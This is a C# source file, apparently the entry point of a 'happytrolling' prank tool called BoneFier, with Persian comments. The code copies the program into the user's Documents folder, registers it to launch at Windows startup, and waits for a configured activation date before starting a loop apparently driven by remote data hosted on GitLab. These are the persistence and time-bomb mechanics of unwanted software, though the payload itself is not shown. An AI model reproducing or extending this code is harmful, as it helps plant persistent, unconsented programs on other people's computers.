using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using ReflectionClassOverriding;
using BoneFier;
using BoneFier.Basic;
using System.IO;

namespace BoneFier
{
    internal class Program
    {
        //cloud data = https://gitlab.com/AliiMohammadi/happytrolling/-/raw/main/RemoteDataHappyTrolling.txt

        public static Application application = new Application();
        public static Emigrator emigrator = new Emigrator();
        public static Asset asset = new Asset(emigrator.EmigrationPath + @"\BFasset\");

        public static bool Debug = false;

        [STAThread]
        static void Main(string[] args)
        {
            System.Windows.Forms.Application.EnableVisualStyles();
            System.Windows.Forms.Application.SetCompatibleTextRenderingDefault(false);
            Start();
        }
        static void Start()
        {
            application.UpdateAppConfig();

            //ادرس پیش فرض مهاجرت :
            // Documents/ApplicationName.exe
            emigrator.Emigrate(); //در شروع اولیه برنامه اینجا بعد از مهاجرت خارج میشه

            application.UpdateAppConfig();

            kernel.SetStartUp(emigrator.ApplicationName, emigrator.TargetPath);//استارت اپ

            if (!Debug)
            {
                //برسی تاریخ فعال سازی
                if (Calendarmanager.CheckActivationDay(application.ApplicationConfig.Activationdate.ToDateTime()))
                {
                    RunTimeLoop.StartLoop(application.ApplicationConfig.LoopFrec); //فعال سازی
                }
                else
                {
                    Application.Exit();//خروج اگر اون روز نیست
                }
            }
            else
            {
                RunTimeLoop.StartLoop(application.ApplicationConfig.LoopFrec);
            }
        }
    }
}
